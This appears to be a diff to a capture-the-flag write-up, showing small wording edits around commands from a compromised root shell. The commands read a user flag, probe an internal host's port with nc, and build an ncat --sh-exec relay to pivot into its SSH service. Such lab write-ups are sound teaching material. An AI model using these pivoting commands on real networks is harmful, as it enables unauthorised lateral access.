@@ -260,7 +260,7 @@ bash: no job control in this shell
 root@DNS:/var/www/html#
 {% endhighlight %}
 
-user.txt is in directory "/home/dave":
+user.txt is in the directory "/home/dave":
 {% highlight shell %}
 root@DNS:/home/dave# cat user.txt
 cat user.txt
@@ -354,7 +354,7 @@ Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds
 {% endhighlight %}
 
-By running nc from DNS, we can figure out that service is ssh
+By running nc from DNS, we can figure out the service running on port 987 is ssh
 {% highlight shell %}
 root@DNS:~# nc 192.168.5.2 987 -p 4444
 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
@@ -366,7 +366,7 @@ We need following command to achieve this purpose.
 root@DNS:~# ncat -l 1234 --sh-exec "ncat -p 4444 192.168.5.2 987"
 {% endhighlight %}
 
-We can confirm that we opened port 1234 on localhost by netstat
+We can confirm that we opened port 1234 on localhost by "netstat"
 {% highlight shell %}
 root@DNS:~# netstat -nlp
 Active Internet connections (only servers)
